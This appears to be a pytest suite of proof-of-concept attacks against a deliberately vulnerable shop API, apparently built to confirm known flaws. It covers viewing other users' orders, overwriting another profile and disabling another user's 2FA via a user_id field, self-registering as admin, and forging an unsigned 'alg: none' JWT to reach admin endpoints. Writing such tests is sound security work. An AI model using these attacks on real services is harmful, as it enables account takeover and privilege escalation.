"""
Access Control & Privilege Escalation PoC Tests (Vulnerabilities #17, #18, #20, #22, #23)
"""
import base64
import json
import uuid

import requests


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _forge_jwt_none(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url(json.dumps(header).encode())
    p = _b64url(json.dumps(payload).encode())
    return f"{h}.{p}."


class TestBOLAOrderDetail:
    """#17 - BOLA on GET /orders/:id (any user can view any order)"""

    def test_vuln_17_bola_order(self, base_url, joe_token):
        """Joe can access Jane's orders (IDs 3, 4, 5) without authorization check."""
        h = {"Authorization": f"Bearer {joe_token}"}
        r = requests.get(f"{base_url}/orders/3", headers=h)
        data = r.json()
        assert data["success"] is True, f"BOLA failed — could not access other user's order: {data}"
        assert data["order"]["id"] == 3


class TestMassAssignmentProfile:
    """#18 - Mass Assignment on PUT /auth/profile (user_id parameter)"""

    def test_vuln_18_mass_assignment(self, base_url, fresh_user, jane_token):
        """Attacker sends user_id of another user to modify their profile."""
        h = fresh_user["header"]
        evil_name = f"HACKED_{uuid.uuid4().hex[:6]}"

        r = requests.put(f"{base_url}/auth/profile", headers=h,
                         json={"name": evil_name, "user_id": 2})
        assert r.json()["success"] is True

        r2 = requests.get(f"{base_url}/auth/me",
                          headers={"Authorization": f"Bearer {jane_token}"})
        assert r2.json()["user"]["name"] == evil_name, \
            "Mass assignment failed — Jane's name was not overwritten"


class TestIDOR2FA:
    """#20 - Broken Access Control on POST /auth/2fa/disable (user_id parameter)"""

    def test_vuln_20_2fa_idor(self, base_url, fresh_user):
        """Attacker can disable 2FA for another user by passing their user_id."""
        h = fresh_user["header"]
        r = requests.post(f"{base_url}/auth/2fa/disable", headers=h,
                          json={"password": fresh_user["password"], "user_id": 2})
        assert r.json()["success"] is True, \
            "IDOR on 2FA disable failed — expected success with another user's ID"


class TestPrivEscRegister:
    """#22 - Privilege Escalation via Mass Assignment on Registration"""

    def test_vuln_22_priv_esc_register(self, base_url):
        """Register with is_admin=1 grants admin privileges."""
        uid = uuid.uuid4().hex[:8]
        r = requests.post(f"{base_url}/auth/register", json={
            "name": "Evil Admin",
            "email": f"evil_{uid}@example.com",
            "password": "password123",
            "is_admin": 1,
        })
        data = r.json()
        assert data["success"] is True
        assert data["user"]["is_admin"] is True, \
            "Privilege escalation failed — is_admin was not set"

        h = {"Authorization": f"Bearer {data['token']}"}
        r2 = requests.get(f"{base_url}/admin/orders", headers=h)
        assert r2.json()["success"] is True, \
            "New admin user could not access /admin/orders"


class TestPrivEscJWTForgery:
    """#23 - Privilege Escalation via JWT Claim Forgery"""

    def test_vuln_23_jwt_admin_forgery(self, base_url):
        """Forge a JWT with is_admin=true using none algorithm to access admin endpoints."""
        token = _forge_jwt_none({
            "user_id": 1,
            "email": "joe@example.com",
            "is_admin": True,
            "exp": 9999999999,
        })
        r = requests.get(f"{base_url}/admin/orders",
                         headers={"Authorization": f"Bearer {token}"})
        data = r.json()
        assert data["success"] is True, f"JWT admin forgery failed: {data}"
        assert len(data["orders"]) > 0
